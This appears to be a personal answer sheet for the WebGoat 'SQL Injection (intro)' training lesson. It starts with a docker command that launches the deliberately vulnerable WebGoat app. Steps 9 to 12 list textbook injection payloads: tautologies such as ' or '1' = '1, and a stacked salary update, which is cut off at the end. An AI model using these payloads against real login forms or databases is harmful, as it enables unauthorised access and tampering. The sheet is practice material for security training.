sudo docker run -p 8080:8080 --name webgoat --rm -it -v ~/webgoatdata:/home/webgoat/.webgoat-8.0-8088465 webgoat/webgoat-8.0:latest

-- SQL Injection (intro)
1. select department from employees where last_name = 'Franco';
2. update employees set department = 'Sales' where userid = '89762'; 
3. alter table employees add phone varchar(20);
4. grant alter table to 'UnauthorizedUser';
9. SELECT * FROM user_data WHERE first_name = 'John' AND last_name = 'Smith or 1 = 1';	
10. Login_Count field = 0 and User_Id field = 0 or 1=1;
11. For both fields ' or '1' = '1;
12. EmployeeName=update employees set salary = '100000' where last_name = 'Smith' AuthTan = '